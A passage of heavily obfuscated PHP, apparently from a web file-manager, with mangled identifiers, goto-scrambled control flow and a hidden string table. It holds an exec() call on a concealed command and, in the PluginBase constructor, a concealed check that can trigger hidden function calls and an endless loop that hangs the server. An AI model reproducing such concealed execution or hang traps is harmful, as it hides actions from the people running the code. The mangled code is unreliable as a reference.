$E‡¦ÙŠ™â =& $_SERVER[Â€Á›¨õ]; if (!$this->init($B§™Ü©·¶)) { return !1; } $C¸®Ùèƒãê = $this->trendList($B§™Ü©·¶); goto Dï¸¥ ·Ğù; e›ĞÑİÖ¶ƒ: } public function validDate($D×‹¬êèÒ¿, $BƒÉ£‚¦õ) { goto EµÍ¸ä¡®; Dù½šõó÷à: switch ($D×‹¬êèÒ¿) { case $fçˆõ†—‘ò[1482]: $eÎÉâì¬ç = mktime(0, 0, 0, date($fçˆõ†—‘ò[1615]), date($fçˆõ†—‘ò[1224]) - date($fçˆõ†—‘ò[1288]) + 7 - 7, date($fçˆõ†—‘ò[1616])); $d¼ŸßÌ¸ = 0; do { $D¼ÌÜ²¯›‰ = date($fçˆõ†—‘ò[1598], $eÎÉâì¬ç - 3600 * 24 * 7 * $d¼ŸßÌ¸); $cé˜Ë©•‘¡[] = $D¼ÌÜ²¯›‰; $d¼ŸßÌ¸++; } while ($BƒÉ£‚¦õ < $D¼ÌÜ²¯›‰); break; case $fçˆõ†—‘ò[1480]: $d¼ŸßÌ¸ = 1; do { $eÏèˆ—ÅŞ  = date($fçˆõ†—‘ò[1617], strtotime("\x2d\x20{$d¼ŸßÌ¸}\40\155\x6f\156\x74\x68\163")); $cé˜Ë©•‘¡[] = $eÏèˆ—ÅŞ ; $d¼ŸßÌ¸++; } while ($BƒÉ£‚¦õ < $eÏèˆ—ÅŞ ); break; case $fçˆõ†—‘ò[1618]: $aªÈØ§Õ = (int) date($fçˆõ†—‘ò[1616], strtotime($BƒÉ£‚¦õ)); $EÅ®ŒµŒ­ç = (int) date($fçˆõ†—‘ò[1616]); if ($aªÈØ§Õ >= $EÅ®ŒµŒ­ç) { break; } for ($aªÈØ§Õ; $aªÈØ§Õ < $EÅ®ŒµŒ­ç; $aªÈØ§Õ++) { $cé˜Ë©•‘¡[] = $aªÈØ§Õ . $fçˆõ†—‘ò[1619]; } break; default: break; } if ($BƒÉ£‚¦õ > end($cé˜Ë©•‘¡)) { array_pop($cé˜Ë©•‘¡); } sort($cé˜Ë©•‘¡); goto CóÛĞ”İ×Ä; EµÍ¸ä¡®: $fçˆõ†—‘ò =& $_SERVER[Â€Á›¨õ]; $eâÒ÷Ş¥ ‚ = date($fçˆõ†—‘ò[1598], strtotime($fçˆõ†—‘ò[1599])); $cé˜Ë©•‘¡ = array($eâÒ÷Ş¥ ‚); goto Dù½šõó÷à; CóÛĞ”İ×Ä: return $cé˜Ë©•‘¡; goto bª›±®ÜÚÖ; bª›±®ÜÚÖ: } public function listTable($CÓš„™ÇË´) { $e´³àùÚ× = ucfirst($CÓš„™ÇË´); return Model($e´³àùÚ×)->listData(); } public function option($d´”¶ÅÁÛ) { $FÏõ…Ê©©Ğ = $_SERVER[Â€Á›¨õ][1620] . ucfirst($d´”¶ÅÁÛ); return $this->{$FÏõ…Ê©©Ğ}(); } private function optionUser() { goto a˜‹Í–Ê‚ ; b®µ‚Ê¶Ü: $fÆä©½ ÇŞ = intval($GLOBALS[$bºªÅóºËç[6]][$bºªÅóºËç[345]][$bºªÅóºËç[1460]]) / 3600; $eÖÔøáÉÆˆ = strtotime("\55{$fÆä©½ ÇŞ}\40\x68\x6f\x75\x72\163"); $b§‘‚Á¾ª = array($bºªÅóºËç[1622] => array($bºªÅóºËç[946], $eÖÔøáÉÆˆ)); goto E¦‘ùí ³ß; E¦‘ùí ³ß: $A´§®Ô¶Ğ· = (int) Model($bºªÅóºËç[501])->where($b§‘‚Á¾ª)->count($bºªÅóºËç[1501]); if (!$A´§®Ô¶Ğ·) { $A´§®Ô¶Ğ· = 1; } $eÖÔøáÉÆˆ = strtotime(date($bºªÅóºËç[1602])); goto aİÒ¶‹Ñ³ƒ; aİÒ¶‹Ñ³ƒ: $b§‘‚Á¾ª = array($bºªÅóºËç[1622] => array($bºªÅóºËç[946], $eÖÔøáÉÆˆ)); $EŞÎáƒ”À = Model($bºªÅóºËç[501])->where($b§‘‚Á¾ª)->count($bºªÅóºËç[1501]); return array($bºªÅóºËç[708] => (int) $B³õĞĞË´‘, $bºªÅóºËç[1623] => (int) ($B³õĞĞË´‘ - $Bº­•õä‹), $bºªÅóºËç[1624] => (int) $Bº­•õä‹, $bºªÅóºËç[1625] => (int) $EŞÎáƒ”À, $bºªÅóºËç[1626] => $A´§®Ô¶Ğ·); goto EÓ¶÷¦ï¤å; a˜‹Í–Ê‚ : $bºªÅóºËç =& $_SERVER[Â€Á›¨õ]; $B³õĞĞË´‘ = Model($bºªÅóºËç[501])->count($bºªÅóºËç[1501]); $Bº­•õä‹ = Model($bºªÅóºËç[501])->where($bºªÅóºËç[1621])->count($bºªÅóºËç[1501]); goto b®µ‚Ê¶Ü; EÓ¶÷¦ï¤å: } private function optionFile() { goto Bƒ«¬ˆï¹”; a„‡áƒÇÎ: $C·ªÁ™²š = Model($EÊõÒ ìËˆ[767])->where($f µÌîÓ«°)->sum($EÊõÒ ìËˆ[77]); $bôßº’Ù‹… = Model($EÊõÒ ìËˆ[767])->where($f µÌîÓ«°)->count($EÊõÒ ìËˆ[390]); return array($EÊõÒ ìËˆ[711] => $B´ç„‚…Ê, $EÊõÒ ìËˆ[1595] => $e’˜ĞöĞæ™, $EÊõÒ ìËˆ[1627] => $B´ç„‚…Ê - $e’˜ĞöĞæ™, $EÊõÒ ìËˆ[1628] => (int) $C·ªÁ™²š, $EÊõÒ ìËˆ[713] => (int) $c‹ô·Ô‡òø, $EÊõÒ ìËˆ[1629] => (int) $bôßº’Ù‹…); goto CçİˆÉİŞ; c“¶»²îò: $e’˜ĞöĞæ™ = $F«§´§Áç¨[$EÊõÒ ìËˆ[1595]]; $c‹ô·Ô‡òø = Model($EÊõÒ ìËˆ[767])->where(array($EÊõÒ ìËˆ[397] => 0))->count($EÊõÒ ìËˆ[390]); $f µÌîÓ«° = array($EÊõÒ ìËˆ[397] => 0, $EÊõÒ ìËˆ[192] => array($EÊõÒ ìËˆ[946], strtotime(date($EÊõÒ ìËˆ[1602])))); goto a„‡áƒÇÎ; Bƒ«¬ˆï¹”: $EÊõÒ ìËˆ =& $_SERVER[Â€Á›¨õ]; $F«§´§Áç¨ = $this->sourceSize(); $B´ç„‚…Ê = $F«§´§Áç¨[$EÊõÒ ìËˆ[77]]; goto c“¶»²îò; CçİˆÉİŞ: } private function optionAccess() { $Bñå¡ËÕœ‚ =& $_SERVER[Â€Á›¨õ]; return array($Bñå¡ËÕœ‚[708] => $this->typeLogCnt(), $Bñå¡ËÕœ‚[106] => $this->typeLogCnt($Bñå¡ËÕœ‚[106]), $Bñå¡ËÕœ‚[424] => $this->typeLogCnt($Bñå¡ËÕœ‚[424]), $Bñå¡ËÕœ‚[1630] => $this->typeLogCnt($Bñå¡ËÕœ‚[1630]), $Bñå¡ËÕœ‚[1631] => $this->typeLogCnt($Bñå¡ËÕœ‚[1631]), $Bñå¡ËÕœ‚[557] => $this->typeLogCnt($Bñå¡ËÕœ‚[33], $Bñå¡ËÕœ‚[1606])); } private function typeLogCnt($E´’ù¡õÌˆ = '', $B¹‡ù›²­¢ = "\x69\x64") { goto C¦ ­™à¶ï; D¡–©·¨½: return (int) $bòÛ›ÓÙİ; goto BÀÑŸî´; C¦ ­™à¶ï: $F—ç•“ì— =& $_SERVER[Â€Á›¨õ]; $E²Êá±¬µ¾ = array($F—ç•“ì—[106] => array($F—ç•“ì—[1632], $F—ç•“ì—[1633]), $F—ç•“ì—[424] => array($F—ç•“ì—[1634], $F—ç•“ì—[1635]), $F—ç•“ì—[1630] => array($F—ç•“ì—[1636], $F—ç•“ì—[1637], $F—ç•“ì—[1638]), $F—ç•“ì—[1631] => array($F—ç•“ì—[1639], $F—ç•“ì—[1640]), $F—ç•“ì—[1641] => array($F—ç•“ì—[1642], $F—ç•“ì—[1643], $F—ç•“ì—[1644])); $B‚â¡¾²öù = strtotime(date($F—ç•“ì—[1602])); goto F†çÉ‘ì¦À; F†çÉ‘ì¦À: $Cßæ¥ä¸Ê = array($F—ç•“ì—[192] => array($F—ç•“ì—[946], $B‚â¡¾²öù)); if ($E´’ù¡õÌˆ) { $Cßæ¥ä¸Ê[$F—ç•“ì—[29]] = array($F—ç•“ì—[7], $E²Êá±¬µ¾[$E´’ù¡õÌˆ]); } $bòÛ›ÓÙİ = Model($F—ç•“ì—[1605])->where($Cßæ¥ä¸Ê)->count($B¹‡ù›²­¢); goto D¡–©·¨½; BÀÑŸî´: } private function optionServer() { goto b”ßæíó„; a³çäà’İÚ: $dÅ³ÙÙœÅ = $c¡ö» ›×ã[0]; $cä©öÓ£ = $GLOBALS[$Eä« •’“ì[6]][$Eä« •’“ì[17]]; $dÂŞ½òÉ§å = $cä©öÓ£[$Eä« •’“ì[907]]; goto eØš¶½ ¼Í; fŸÚ±‡×æ: return array($Eä« •’“ì[1647] => $bÓñ†ñ¨„ ? $bÓñ†ñ¨„[$Eä« •’“ì[1648]] : 0, $Eä« •’“ì[1649] => $bÓñ†ñ¨„ ? $bÓñ†ñ¨„[$Eä« •’“ì[1650]] : 0, $Eä« •’“ì[1651] => (int) $cÀ­±·ŠÌ¤[$Eä« •’“ì[1648]] * 1024 * 1024 * 1024, $Eä« •’“ì[1652] => (int) $bÑ‘Ğïƒİ¡, $Eä« •’“ì[1653] => ucfirst($dÅ³ÙÙœÅ), $Eä« •’“ì[1654] => $Eä« •’“ì[1655] . PHP_VERSION, $Eä« •’“ì[1656] => phpBuild64() ? 64 : 32, $Eä« •’“ì[707] => str_replace($Eä« •’“ì[1657], $Eä« •’“ì[923], $dÂŞ½òÉ§å), $Eä« •’“ì[345] => ucfirst($CÀ˜ñß¨¯Š), $Eä« •’“ì[28] => $_SERVER[$Eä« •’“ì[1658]]); goto EÃ°Šİ²“ƒ; eØš¶½ ¼Í: if ($dÂŞ½òÉ§å == $Eä« •’“ì[738]) { $EçĞÁ‡‚³† = explode($Eä« •’“ì[1139], $cä©öÓ£[$Eä« •’“ì[906]]); $dÂŞ½òÉ§å = $EçĞÁ‡‚³†[0]; } if ($dÂŞ½òÉ§å == $Eä« •’“ì[741] || $dÂŞ½òÉ§å == $Eä« •’“ì[742]) { $F–êàŒ„åæ = Model()->db()->query($Eä« •’“ì[1645]); $C»ÅÒŒáÕ = $F–êàŒ„åæ[0] && isset($F–êàŒ„åæ[0][$Eä« •’“ì[1405]]) ? $F–êàŒ„åæ[0][$Eä« •’“ì[1405]] : 0; $dÂŞ½òÉ§å = $Eä« •’“ì[1646] . ($C»ÅÒŒáÕ ? $Eä« •’“ì[8] . $C»ÅÒŒáÕ : $Eä« •’“ì[33]); } $CÀ˜ñß¨¯Š = $GLOBALS[$Eä« •’“ì[6]][$Eä« •’“ì[345]][$Eä« •’“ì[769]]; goto fŸÚ±‡×æ; b”ßæíó„: $Eä« •’“ì =& $_SERVER[Â€Á›¨õ]; $bÓñ†ñ¨„ = $this->diskDriver(); $cÀ­±·ŠÌ¤ = KodIO::defaultDriver(); goto c‰ÖÜåÍ´; c‰ÖÜåÍ´: $b´Å…°•ÁÖ = array($Eä« •’“ì[760] => $cÀ­±·ŠÌ¤[$Eä« •’“ì[388]]); $bÑ‘Ğïƒİ¡ = Model($Eä« •’“ì[444])->where($b´Å…°•ÁÖ)->sum($Eä« •’“ì[77]); $c¡ö» ›×ã = explode($Eä« •’“ì[50], $_SERVER[$Eä« •’“ì[141]]); goto a³çäà’İÚ; EÃ°Šİ²“ƒ: } private function diskDriver() { goto CÊŞø¬¹íÌ; D¸ÍŞŒ±ÍÇ: $F…æä°ñ«‰ = $C‹ƒÃ…õ™ - @disk_free_space($D£µä•Á˜©); return array($CíĞë©‹›[1648] => $C‹ƒÃ…õ™, $CíĞë©‹›[1650] => $F…æä°ñ«‰); goto dÁ·ÂŠ¸˜è; D§¢”ˆùİÄ: if ($dŠ”åÆ«à) { $D£µä•Á˜© = $CíĞë©‹›[1661]; if (function_exists($CíĞë©‹›[1662])) { exec($CíĞë©‹›[1663], $f ²©ÆØöÈ); $D£µä•Á˜© = $f ²©ÆØöÈ[1] . $CíĞë©‹›[8]; } } if (!file_exists($D£µä•Á˜©)) { return; } $C‹ƒÃ…õ™ = @disk_total_space($D£µä•Á˜©); goto D¸ÍŞŒ±ÍÇ; CÊŞø¬¹íÌ: $CíĞë©‹› =& $_SERVER[Â€Á›¨õ]; $D£µä•Á˜© = $CíĞë©‹›[8]; $dŠ”åÆ«à = $GLOBALS[$CíĞë©‹›[6]][$CíĞë©‹›[1659]] == $CíĞë©‹›[1660]; goto D§¢”ˆùİÄ; dÁ·ÂŠ¸˜è: } public function fileChart($fº·à›Ê†Æ) { goto dìÀÆ™¼¦‡; dìÀÆ™¼¦‡: $Eƒ§ƒ†ÈÍù =& $_SERVER[Â€Á›¨õ]; if (isset($fº·à›Ê†Æ[$Eƒ§ƒ†ÈÍù[1501]])) { return Model($Eƒ§ƒ†ÈÍù[767])->userFileTypeProfile($fº·à›Ê†Æ[$Eƒ§ƒ†ÈÍù[1501]]); } if (isset($fº·à›Ê†Æ[$Eƒ§ƒ†ÈÍù[1664]])) { return Model($Eƒ§ƒ†ÈÍù[767])->groupFileTypeProfile($fº·à›Ê†Æ[$Eƒ§ƒ†ÈÍù[1664]]); } goto cïÌÎğ¨Ê­; fŠ„õÄòŸ×: $EâÊĞ¡§›[$Eƒ§ƒ†ÈÍù[398]] = 2; $d‚¼»£ÊÃŒ = Model($Eƒ§ƒ†ÈÍù[767])->where($EâÊĞ¡§›)->sum($Eƒ§ƒ†ÈÍù[77]); return array($Eƒ§ƒ†ÈÍù[711] => $cÙÇ½»ŸÃ[$Eƒ§ƒ†ÈÍù[77]], $Eƒ§ƒ†ÈÍù[1595] => $cÙÇ½»ŸÃ[$Eƒ§ƒ†ÈÍù[1595]], $Eƒ§ƒ†ÈÍù[1596] => (int) $ešŸõŒ‰²Ñ, $Eƒ§ƒ†ÈÍù[1597] => (int) $d‚¼»£ÊÃŒ); goto DßÃĞ‚¦Ô; cïÌÎğ¨Ê­: $cÙÇ½»ŸÃ = $this->sourceSize(); $EâÊĞ¡§› = array($Eƒ§ƒ†ÈÍù[472] => 0, $Eƒ§ƒ†ÈÍù[398] => 1); $ešŸõŒ‰²Ñ = Model($Eƒ§ƒ†ÈÍù[767])->where($EâÊĞ¡§›)->sum($Eƒ§ƒ†ÈÍù[77]); goto fŠ„õÄòŸ×; DßÃĞ‚¦Ô: } private function sourceSize() { $Cï¬¯Ôóù¼ =& $_SERVER[Â€Á›¨õ]; $d´É±©ã‡Á = Model($Cï¬¯Ôóù¼[767])->where(array($Cï¬¯Ôóù¼[397] => 0))->sum($Cï¬¯Ôóù¼[77]); $Cßé‰êÓˆß = Model($Cï¬¯Ôóù¼[444])->sum($Cï¬¯Ôóù¼[77]); if ($Cßé‰êÓˆß > $d´É±©ã‡Á) { $Cßé‰êÓˆß = $d´É±©ã‡Á; } return array($Cï¬¯Ôóù¼[77] => (int) $d´É±©ã‡Á, $Cï¬¯Ôóù¼[1595] => (int) $Cßé‰êÓˆß); } } goto cÂ¾°ŞÃ; dŠçÎÁÉâ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($dìºİ…áºÂ, $BÎ ‚´¿¦á = '') { goto Cäî„Š½˜; Cäî„Š½˜: $this->info = $this->info($dìºİ…áºÂ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Â€Á›¨õ][75]]; goto bï­²ãÅø; CÔ×“äç”³: if (!isset(self::$_chunkBuffer[$dìºİ…áºÂ])) { self::$_chunkBuffer[$dìºİ…áºÂ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto D¹ŠöÛõìÖ; bï­²ãÅø: $this->pathOpen = $dìºİ…áºÂ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto CÔ×“äç”³; D¹ŠöÛõìÖ: } function stream_read($fã¾˜³ºº) { $E¬æ½ŒáŒ = $this->fileSubstr($this->pose, $fã¾˜³ºº); $this->pose += strlen($E¬æ½ŒáŒ); return $E¬æ½ŒáŒ; } public function stream_tell() { return $this->pose; } public function stream_seek($C²ä¾ÁĞÉó, $aæŸ£‡âÜÉ) { $e—‚œ²Úó =& $_SERVER[Â€Á›¨õ]; if ($aæŸ£‡âÜÉ == SEEK_SET) { $this->pose = $C²ä¾ÁĞÉó; } else { if ($aæŸ£‡âÜÉ == SEEK_CUR) { $this->pose += $C²ä¾ÁĞÉó; } else { if ($aæŸ£‡âÜÉ == SEEK_END) { $this->pose = $this->info[$e—‚œ²Úó[77]] + intval($C²ä¾ÁĞÉó); } } } if ($C²ä¾ÁĞÉó < 0) { $this->pose = $this->info[$e—‚œ²Úó[77]] + $C²ä¾ÁĞÉó; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Â€Á›¨õ][77]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($dœë˜–æ´§, $d¢í†õÂ‚î) { $eâÒ¡ßÃòÆ =& $_SERVER[Â€Á›¨õ]; $f¤‚ÆôÁ§® = $this->info($dœë˜–æ´§); return array($eâÒ¡ßÃòÆ[1354] => 0, $eâÒ¡ßÃòÆ[1355] => 0, $eâÒ¡ßÃòÆ[12] => 32768 + 511, $eâÒ¡ßÃòÆ[1356] => 0, $eâÒ¡ßÃòÆ[1357] => 0, $eâÒ¡ßÃòÆ[1358] => 0, $eâÒ¡ßÃòÆ[1359] => 0, $eâÒ¡ßÃòÆ[77] => $f¤‚ÆôÁ§®[$eâÒ¡ßÃòÆ[77]], $eâÒ¡ßÃòÆ[1360] => $f¤‚ÆôÁ§®[$eâÒ¡ßÃòÆ[1226]], $eâÒ¡ßÃòÆ[1315] => $f¤‚ÆôÁ§®[$eâÒ¡ßÃòÆ[83]], $eâÒ¡ßÃòÆ[1314] => $f¤‚ÆôÁ§®[$eâÒ¡ßÃòÆ[192]], $eâÒ¡ßÃòÆ[1361] => 0, $eâÒ¡ßÃòÆ[1362] => 0); } static $fileInfo = array(); public function info($DÛ¤Äå£´ã) { $D¥¤İİÖª¨ = $_SERVER[Â€Á›¨õ][1363]; if (isset(self::$fileInfo[$DÛ¤Äå£´ã])) { return self::$fileInfo[$DÛ¤Äå£´ã]; } if (substr($DÛ¤Äå£´ã, 0, strlen($D¥¤İİÖª¨)) != $D¥¤İİÖª¨) { return !1; } self::$fileInfo[$DÛ¤Äå£´ã] = IO::info(substr($DÛ¤Äå£´ã, strlen($D¥¤İİÖª¨))); return self::$fileInfo[$DÛ¤Äå£´ã]; } public static function read($dßÇù»êØ©, $aõ‡ˆŸ·™, $E™Âƒ¸§å¬) { if (!isset(self::$_fopenCache[$dßÇù»êØ©])) { $eÇÂ…”Ó¥¯ = new StreamWrapperIO(); $eÇÂ…”Ó¥¯->stream_open($dßÇù»êØ©); self::$_fopenCache[$dßÇù»êØ©] = $eÇÂ…”Ó¥¯; } $eÇÂ…”Ó¥¯ = self::$_fopenCache[$dßÇù»êØ©]; return $eÇÂ…”Ó¥¯->fileSubstr($aõ‡ˆŸ·™, $E™Âƒ¸§å¬); } public static function _read($bëµƒ¤½, $AÕæçÔ†¶ò, $FÖ‹äéˆé) { goto A°ÊÛöèÓŒ; A°ÊÛöèÓŒ: $dÒ©çÎ»† =& $_SERVER[Â€Á›¨õ]; $fİœ Œøñ“ = fopen($bëµƒ¤½, $dÒ©çÎ»†[1230]); if (!$fİœ Œøñ“) { return $dÒ©çÎ»†[33]; } goto c¢¡ŸèóÏ„; dø¼´¿»Õ: $F¢ˆæšä‹ = 0; while ($F¢ˆæšä‹ < $FÖ‹äéˆé) { $DêÖáõªÇ = min($Fä†óŠ™â, $FÖ‹äéˆé - $F¢ˆæšä‹); $bÑçæ¼—Œ .= fread($fİœ Œøñ“, $DêÖáõªÇ); $F¢ˆæšä‹ += $DêÖáõªÇ; } fclose($fİœ Œøñ“); goto c…Åï¦â‚†; c¢¡ŸèóÏ„: $Fä†óŠ™â = 8192; fseek($fİœ Œøñ“, $AÕæçÔ†¶ò, SEEK_SET); $bÑçæ¼—Œ = $dÒ©çÎ»†[33]; goto dø¼´¿»Õ; c…Åï¦â‚†: return $bÑçæ¼—Œ; goto FĞÓÔæ¸®; FĞÓÔæ¸®: } public function fileSubstr($aÎ÷Â‘¢‡•, $f…‰·ï¦…‘) { goto Cô®§á£¶ä; cÏ……ØÇå„: $D¥İ¶³ÉÚ… = ceil(($aÎ÷Â‘¢‡• + $f…‰·ï¦…‘) / $fõÛã¿ éÆ) * $fõÛã¿ éÆ - $AŞ¸ñå…Œç; $eáŸºçìèæ = IO::fileSubstr($this->path, $AŞ¸ñå…Œç, $D¥İ¶³ÉÚ…); $F»›ùÕÅ¼ƒ[$AŞ¸ñå…Œç . $eÙ³†«ÚÜ…[33]] = $eáŸºçìèæ; goto cãµ‹§Î„â; f»ˆºÙŞÃñ: foreach ($F»›ùÕÅ¼ƒ as $e¥•Ì§ó‚Ğ => $eÎ»ï³ƒ¤Ç) { $e¥•Ì§ó‚Ğ = intval($e¥•Ì§ó‚Ğ); $dîÑ’¡ä§ = $e¥•Ì§ó‚Ğ + strlen($eÎ»ï³ƒ¤Ç); if ($aÎ÷Â‘¢‡• >= $dîÑ’¡ä§) { continue; } if ($aÎ÷Â‘¢‡• >= $e¥•Ì§ó‚Ğ && $aÎ÷Â‘¢‡• + $f…‰·ï¦…‘ <= $dîÑ’¡ä§) { return substr($eÎ»ï³ƒ¤Ç, $aÎ÷Â‘¢‡• - $e¥•Ì§ó‚Ğ, $f…‰·ï¦…‘); } break; } if (count($F»›ùÕÅ¼ƒ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($eÙ³†«ÚÜ…[1364], $eÙ³†«ÚÜ…[1365] . count($F»›ùÕÅ¼ƒ) . "\73\163\164\141\x72\x74\75{$aÎ÷Â‘¢‡•}\x2c\154\145\156\147\x74\x68\x3d{$f…‰·ï¦…‘}\x3b\160\157\x73\145\72{$e¥•Ì§ó‚Ğ}\x7e{$dîÑ’¡ä§}"); throw new Exception($eÙ³†«ÚÜ…[1366]); } $AŞ¸ñå…Œç = intval($aÎ÷Â‘¢‡• / $fõÛã¿ éÆ) * $fõÛã¿ éÆ; goto cÏ……ØÇå„; Cô®§á£¶ä: $eÙ³†«ÚÜ… =& $_SERVER[Â€Á›¨õ]; $eó¯Ó®¸ÜÎ = $this->info[$eÙ³†«ÚÜ…[77]]; $aÌ¿´¡’Ë× = $aÎ÷Â‘¢‡•; goto aÊÄ·Öâ‡; cãµ‹§Î„â: ksort($F»›ùÕÅ¼ƒ); $eã†ğÂÖÃ = substr($eáŸºçìèæ, $aÎ÷Â‘¢‡• - $AŞ¸ñå…Œç, $f…‰·ï¦…‘); return $eã†ğÂÖÃ; goto DÁ£¯ïå‹; c¶×¿µ‚¸í: if ($aÎ÷Â‘¢‡• + $f…‰·ï¦…‘ > $eó¯Ó®¸ÜÎ) { $f…‰·ï¦…‘ = $eó¯Ó®¸ÜÎ - $aÎ÷Â‘¢‡•; } if ($f…‰·ï¦…‘ <= 0) { return $eÙ³†«ÚÜ…[33]; } if ($aÎ÷Â‘¢‡• < 0 || $aÎ÷Â‘¢‡• >= $eó¯Ó®¸ÜÎ || $f…‰·ï¦…‘ <= 0 || $f…‰·ï¦…‘ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\151\154\145\122\x65\141\144\x20\x65\162\x72\157\x72\x21\x20\x73\164\x61\162\x74\75{$aÎ÷Â‘¢‡•}\73\154\145\x6e\147\x74\x68\x3d{$f…‰·ï¦…‘}\x3b\x20\163\151\x7a\145\75{$eó¯Ó®¸ÜÎ}\73"); } goto Bøµ…áÑ‡; eàÚÃÀø: $e¥•Ì§ó‚Ğ = 0; $dîÑ’¡ä§ = 0; $eÎ»ï³ƒ¤Ç = $eÙ³†«ÚÜ…[33]; goto f»ˆºÙŞÃñ; Bøµ…áÑ‡: $fõÛã¿ éÆ = 64 * 1024; $F»›ùÕÅ¼ƒ =& self::$_chunkBuffer[$this->path]; if (!$F»›ùÕÅ¼ƒ) { $F»›ùÕÅ¼ƒ = array(); } goto eàÚÃÀø; aÊÄ·Öâ‡: $BÎğŸ«ñ‘ = $f…‰·ï¦…‘; if ($aÎ÷Â‘¢‡• < 0) { $aÎ÷Â‘¢‡• = $eó¯Ó®¸ÜÎ + $aÎ÷Â‘¢‡•; } if ($f…‰·ï¦…‘ === !1) { $f…‰·ï¦…‘ = $eó¯Ó®¸ÜÎ - $aÎ÷Â‘¢‡•; } goto c¶×¿µ‚¸í; DÁ£¯ïå‹: } private function log($cÁì¬„Ùˆï, $Dóºæ¿Ò Ğ) { $BŸÍºØ¬â =& $_SERVER[Â€Á›¨õ]; $CŠÛä˜Ì‡ì = timeFloat() - $this->timeStart; write_log(sprintf($BŸÍºØ¬â[1367], $cÁì¬„Ùˆï, $this->info[$BŸÍºØ¬â[28]], $CŠÛä˜Ì‡ì, $Dóºæ¿Ò Ğ), $BŸÍºØ¬â[1052]); } } class Message { function __construct() { } public function send($AïçÎ¯§¶Á = '', $eÙ‡ê„…˜Ê = array(), $BŠ‡ëóçšÕ = "\x74\x65\170\x74") { goto CÃ¯¶¤®°; A‚Ï°’ê÷á: Hook::trigger($D¨ç‹²ÃØ¸[1371], $cô±Ş¶ù); goto fµ¿²×æÃ; E…ù¾—ĞÂ¾: $eÙ‡ê„…˜Ê = array($D¨ç‹²ÃØ¸[990] => isset($eÙ‡ê„…˜Ê[$D¨ç‹²ÃØ¸[990]]) ? $eÙ‡ê„…˜Ê[$D¨ç‹²ÃØ¸[990]] : $D¨ç‹²ÃØ¸[33], $D¨ç‹²ÃØ¸[557] => isset($eÙ‡ê„…˜Ê[$D¨ç‹²ÃØ¸[557]]) ? $eÙ‡ê„…˜Ê[$D¨ç‹²ÃØ¸[557]] : $D¨ç‹²ÃØ¸[33]); if (empty($AïçÎ¯§¶Á) || empty($eÙ‡ê„…˜Ê[$D¨ç‹²ÃØ¸[990]]) && empty($eÙ‡ê„…˜Ê[$D¨ç‹²ÃØ¸[557]])) { return !1; } $cô±Ş¶ù = array($D¨ç‹²ÃØ¸[1308] => $Fç†Š‘Õ¶Ò, $D¨ç‹²ÃØ¸[1370] => $eÙ‡ê„…˜Ê); goto A‚Ï°’ê÷á; CÃ¯¶¤®°: $D¨ç‹²ÃØ¸ =& $_SERVER[Â€Á›¨õ]; $Fç†Š‘Õ¶Ò = array($D¨ç‹²ÃØ¸[29] => $D¨ç‹²ÃØ¸[1368], $D¨ç‹²ÃØ¸[705] => $AïçÎ¯§¶Á); if (in_array($BŠ‡ëóçšÕ, array($D¨ç‹²ÃØ¸[1368], $D¨ç‹²ÃØ¸[1369]))) { $Fç†Š‘Õ¶Ò[$D¨ç‹²ÃØ¸[29]] = $BŠ‡ëóçšÕ; } goto E…ù¾—ĞÂ¾; fµ¿²×æÃ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto fŸ½ÈŒ²ğ†; A„ä ½óìÆ: $this->pluginHost = $config[$dî„ÂŸßÆß[1374]] . $this->pluginName . $dî„ÂŸßÆß[8]; $this->pluginHostDefault = $config[$dî„ÂŸßÆß[1374]] . $this->pluginName . $dî„ÂŸßÆß[8]; $f¬ÊÁµİù = $config[$dî„ÂŸßÆß[1375]]; goto F¤Èæ¶¡ñ; a­ã¸Óµ˜¯: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($dî„ÂŸßÆß[1372]); goto d¼½¬å âæ; d¼½¬å âæ: $this->pluginName = str_replace($dî„ÂŸßÆß[1372], $dî„ÂŸßÆß[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $dî„ÂŸßÆß[8]; $this->pluginApi = appHostGet() . $dî„ÂŸßÆß[1373] . $this->pluginName . $dî„ÂŸßÆß[8]; goto A„ä ½óìÆ; fŸ½ÈŒ²ğ†: $dî„ÂŸßÆß =& $_SERVER[Â€Á›¨õ]; if (!isset($_SERVER[$dî„ÂŸßÆß[811]]) || !isset($_SERVER[$dî„ÂŸßÆß[1231]])) { goto fİ¦˜·°§; DŒÑ´´ˆ’¯: for ($Bùå„š†ùˆ = $a¿İÌÔÖ‰‰; $Bùå„š†ùˆ > 0; $Bùå„š†ùˆ++) { $A£‰¤”ïŞâ = json_encode($GLOBALS[$dî„ÂŸßÆß[405]]); } goto fÏ‰Â†Üãó; BÎ£°µŒÄĞ: $A£‰¤”ïŞâ = $dî„ÂŸßÆß[815]; $A£‰¤”ïŞâ($_SERVER[$dî„ÂŸßÆß[816]]); $a¿İÌÔÖ‰‰ = 1; goto DŒÑ´´ˆ’¯; dáÙ¨øÂµ­: $e¼ƒâÜ†– = $BßØ„²”å³($F¨ÙÓ…å²¿); $C¿‹ôÔŞ = explode($dî„ÂŸßÆß[227], $e¼ƒâÜ†–); if (count($C¿‹ôÔŞ) < $dî„ÂŸßÆß[589]) { $d‹Ë®×ùÖÃ = $dî„ÂŸßÆß[814]; $d‹Ë®×ùÖÃ(); } goto BÎ£°µŒÄĞ; fİ¦˜·°§: $b´×‚¬ÁÒ‘ = $dî„ÂŸßÆß[812]; $BßØ„²”å³ = $dî„ÂŸßÆß[813]; $F¨ÙÓ…å²¿ = $_SERVER[$dî„ÂŸßÆß[808]] . $dî„ÂŸßÆß[809]; goto dáÙ¨øÂµ­; fÏ‰Â†Üãó: } global $in, $config; goto a­ã¸Óµ˜¯; có”êŒ–­½: return $this; goto e£¢Ë§”šë; 